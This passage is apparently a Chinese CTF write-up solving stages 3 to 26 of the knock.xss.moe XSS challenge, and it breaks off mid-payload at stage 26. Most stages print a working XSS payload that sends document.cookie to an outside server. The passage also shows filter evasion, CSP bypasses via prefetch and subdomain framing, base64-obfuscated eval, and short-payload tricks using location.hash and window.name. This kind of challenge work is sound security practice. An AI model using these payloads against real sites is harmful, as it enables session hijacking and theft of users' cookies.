title="stage3"></a>stage3</h2><p>第三关q参数可控，直接闭合a标签<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171938-d2b25d60-2c4b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q="&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209171956-ddeee3c4-2c4b-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h2><p>和第三关同理，只不过把双引号变成了单引号</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172148-209163d2-2c4c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2375e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q='&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172351-69d3e862-2c4c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h2><p>直接闭合textarea标签<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172508-97a813f8-2c4c-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fea7c73bbe92f7880fc15514e076e838d2ce8a90.knock.xss.moe/?q=&lt;/textarea&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172821-0ab721f4-2c4d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h2><p>直接闭合xmp<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209172900-21ce7c84-2c4d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d82fe27901fa05dcfa8980262fc811645543e374.knock.xss.moe/?q=&lt;/xmp&gt;&lt;script&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209173022-52a5ad1e-2c4d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage7"><a href="#stage7" class="headerlink" title="stage7"></a>stage7</h2><p>第七关尖括号被转义了<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209173128-7a559568-2c4d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209173349-ce016fac-2c4d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>我们可以用onfocus事件，并且用它的autofocus属性去触发onfocus事件<br>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=XSS" autofocus onfocus="document.location=`http://134.175.33.164:1234/?${document.cookie}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209174003-ad542370-2c4e-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage8"><a href="#stage8" class="headerlink" title="stage8"></a>stage8</h2><p>和第七关同理，只不过把双引号变成了单引号<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209174302-178c26b6-2c4f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><p>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b65797d44372ecb2b2552e32f10ec75f1bddcca6.knock.xss.moe/?q=xss' autofocus onfocus='document.location=`http://134.175.33.164:1234/?${document.cookie}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209174251-116fec86-2c4f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage9"><a href="#stage9" class="headerlink" title="stage9"></a>stage9</h2><p>和第七关同理，但是没有引号</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175510-c9b68eac-2c50-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS autofocus onfocus=document.location=`http://134.175.33.164:1234/?${document.cookie}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175502-c4b14618-2c50-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage10"><a href="#stage10" class="headerlink" title="stage10"></a>stage10</h2><p>这题双引号被转义了，无法闭合双引号。所以我们可以考虑用javascript伪协议<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175619-f32198a4-2c50-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180032-89818660-2c51-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${document.cookie}`</span><br></pre></td></tr></tbody></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209175846-4ac5567c-2c51-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage11"><a href="#stage11" class="headerlink" title="stage11"></a>stage11</h2><p>和stage10同理</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180346-fd688420-2c51-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${document.cookie}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180335-f6e291fe-2c51-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage12"><a href="#stage12" class="headerlink" title="stage12"></a>stage12</h2><p>12关发现有CSP，只能默认同源下的资源加载，iframe标签也只能加载同源资源，但是有inline存在，所以我们可以用预加载Bypass掉CSP<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209180949-d5ae7d3a-2c52-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>尝试构造<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var xss = document.createElement(`link`);</span><br><span class="line">xss.setAttribute(`rel`, `prefetch`);</span><br><span class="line">xss.setAttribute(`href`, `http://134.175.33.164:1234/?${document.cookie}`);</span><br><span class="line">document.head.appendChild(xss);</span><br></pre></td></tr></tbody></table></figure><p></p><p>最终payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://a4f51941335441be0fdb21c2890ec17b1d0f08f0.knock.xss.moe/?q=javascript:var xss = document.createElement(`link`);xss.setAttribute(`rel`, `prefetch`);xss.setAttribute(`href`, `http://134.175.33.164:1234/?${document.cookie}`);document.head.appendChild(xss);</span><br><span class="line">//页面渲染完毕会创建 Link REL=prefetch 的标签，向目标页面发起预加载</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209182107-698930ee-2c54-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage13"><a href="#stage13" class="headerlink" title="stage13"></a>stage13</h2><p>十三关发现过滤了很多字符如window，document,cookie，img等字符，不过fuzz了一下发现svg可以用，其它的我们可以用base64编码绕过<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=eval(atob("ZG9jdW1lbnQubG9jYXRpb249YGh0dHA6Ly8xMzQuMTc1LjMzLjE2NDoxMjM0Lz8ke2RvY3VtZW50LmNvb2tpZX1g"))&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209214338-b48725bc-2c70-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage14"><a href="#stage14" class="headerlink" title="stage14"></a>stage14</h2><p>14关又发现CSP</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209220036-12e09902-2c73-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>但是和12关相比，它没有了unline，所以预加载的方法行不通了，但是我们可以看到这里<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frame-src http://*.knock.xss.moe</span><br></pre></td></tr></tbody></table></figure><p></p><p>它允许knock.xss.moe的所有子域的资源可以被frame访问，那么问题来了，我们怎么样才可以用到knock.xss.moe子域的资源呢，灵机一动：既然是所有的子域，我们可利用其它关卡嘛</p><p>尝试构造<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=alert(1);</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现可以执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209231642-b4c18556-2c7d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>然后我们再通过document.domain指定域，跨域获得flag(cookie)<br>最终payload：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3cb34c8407410e2d6c1d708b786ce69a0192b470.knock.xss.moe/?q=http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=XSS%20autofocus%20onfocus=document.domain=`knock.xss.moe`;window.open(`http://134.175.33.164:1234/?${parent.document.cookie}`)</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209231721-cbc893de-2c7d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage15"><a href="#stage15" class="headerlink" title="stage15"></a>stage15</h2><p>直接用svg就OK了<br>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e3bcee011cad77ba066ca7c2ad2884372aec9566.knock.xss.moe/?q=%3Csvg/onload=document.location=`http://134.175.33.164:1234/?${document.cookie}`%3E</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209233017-9a38767a-2c7f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage16"><a href="#stage16" class="headerlink" title="stage16"></a>stage16</h2><p>16关是跳转到q参数所对应的网址<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209234736-05ca184c-2c82-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>很容易想到用JavaScript伪协议<br>payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://86620d66a1b474c588ef787b711b0f1d8843a1af.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${parent.document.cookie}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209234712-f75bae24-2c81-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage17"><a href="#stage17" class="headerlink" title="stage17"></a>stage17</h2><p>和stage16一样</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209235428-fb24f28a-2c82-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://34a131df991487bf58d3df0a85e247d396fb93a0.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${parent.document.cookie}`</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190209235524-1c84d67a-2c83-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage18"><a href="#stage18" class="headerlink" title="stage18"></a>stage18</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000233-1c2c77d6-2c84-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>尝试代码注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000303-2e3fd134-2c84-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>发现给单引号前面加了一个<code>\</code>，但是我们在单引号前面再加一个<code>\</code>吃掉它</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000505-77024604-2c84-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>最终payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c6a860d0948320766d5c4d8dc3bbdcdf9dd95884.knock.xss.moe/?q=1\');document.location=`http://134.175.33.164:1234/?${document.cookie}`;//</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210000819-eaa83514-2c84-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage19"><a href="#stage19" class="headerlink" title="stage19"></a>stage19</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210001114-5319455c-2c85-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>尝试代码注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210001131-5d036e76-2c85-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>但是我发现我用这个payload老是打不到cookie<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=XSS%27);window.open(`http://134.175.33.164:1234/?${document.cookie}`);//</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后发现，必须要我把前面那个xss的弹窗点了之后后面的js代码才会触发，然而后台的bot并不会点击弹窗，所以才导致我们后面的代码不会执行，所以我们的利用点必须是在alert里面，尝试一波发现alert里面可以用其它函数，原因不明，有知道的师傅还请科普<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210122843-595e90fe-2cec-1.gif" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><br>最终payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=XSS',window.open(`http://134.175.33.164:1234/?${document.cookie}`));//</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210123113-b29600e4-2cec-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage20"><a href="#stage20" class="headerlink" title="stage20"></a>stage20</h2><p>发现script被替换为空，双写script即可绕过<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210010749-3a55d88e-2c8d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://303f34eb0a974a432254a4cb2d6e07fa6f8b0b7f.knock.xss.moe/?q=&lt;scriscriptpt&gt;document.location=`http://134.175.33.164:1234/?${document.cookie}`&lt;/scriscriptpt&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210010717-2788d396-2c8d-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage21"><a href="#stage21" class="headerlink" title="stage21"></a>stage21</h2><p>和上一题差不多，只不过这题双写script没有用，但是我们可以用大小写绕过，但是发现无论怎么样都收不到cookie，查看一波响应头，发现<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210110523-b51fff10-2ce0-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><blockquote><p>X-XSS-Protection:1;mode=block,这里使用了XSS过滤，如果检测到攻击，就会浏览器会阻止页面渲染</p></blockquote><p>但是它会把script替换为空，所以我们可以利用script混淆代码，导致浏览器检测不出xss；<br>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=&lt;Script&gt;docuscriptment.loscriptcation=`http://134.175.33.164:1234/?${document.cookie}`&lt;/sCript&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210124435-90e7f59a-2cee-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage22"><a href="#stage22" class="headerlink" title="stage22"></a>stage22</h2><p>22关发现有长度限制<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210124627-d3aff0a8-2cee-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>发现最大长度是65<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210124716-f0ce5968-2cee-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>标签首先考虑用svg比较合适，然后用<code>//</code>代替<code>http://</code>，IP使用十进制ip<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174223-2ae0a1e6-2d18-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><br>刚好65个踩点，最后payload<br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/?q=&lt;svg/onload=window.open(`//2259624356:1234/?${document.cookie}`)&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174143-12f61548-2d18-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage23"><a href="#stage23" class="headerlink" title="stage23"></a>stage23</h2><p>这题限制55个字符<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174544-a299cfbe-2d18-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210174606-afa4f792-2d18-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>我们可以使用<code>location.hash</code>，然后<code>&lt;svg/onload=eval(location.hash.slice(1))&gt;</code>，最后在<code>#</code>后面再加上我们的payload</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210202538-f9313e46-2d2e-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>长度41，没毛病</p><p>最终payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`http://134.175.33.164:1234/?${document.cookie}`)</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210202037-461ad754-2d2e-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage24"><a href="#stage24" class="headerlink" title="stage24"></a>stage24</h2><p>这关限制字符45，但是stage23的payload仍然能用<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1498f071159fd60222c0e7e82b7b6ff046e9e52e.knock.xss.moe/?q=&lt;svg/onload=eval(location.hash.slice(1))&gt;#window.open(`http://134.175.33.164:1234/?${document.cookie}`)</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210202338-b172824a-2d2e-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><h2 id="stage25"><a href="#stage25" class="headerlink" title="stage25"></a>stage25</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210203148-d5abe3bc-2d2f-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>这关限制35个字符，这还让不让人活了。这题前前后后搞了一小时，弄得我头皮发麻，无奈查了很多Short XSS，功夫不负有心人，发现了一片新天地</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210212556-65bb09fe-2d37-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>既然后台的bot是直接加载我们提交的URL，那么我们尝试在我们vps上部署以下代码<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.name = "location.href=`http://134.175.33.164:1234/?${parent.document.cookie}`";</span><br><span class="line">location.href = "http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=&lt;svg/onload=eval(window.name)&gt;";</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后把我的vps的链接直接提交过去</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210211800-4a1ad7c0-2d36-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p>Getflag<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190210211550-fcc397aa-2d35-1.png" alt="image.png" title="">                </div>                <div class="image-caption">image.png</div>            </figure><p></p><h2 id="stage26"><a href="#stage26" class="headerlink" title="stage26"></a>stage26</h2><p>这题回把我们payload全部转化为大写，但是js中的函数是区分大小写的，但是我们可以用HTML实体编码绕过，然后再urlencode，不然浏览器会把<code>#</code>后面当作描点<br>payload<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=&lt;img src="x" 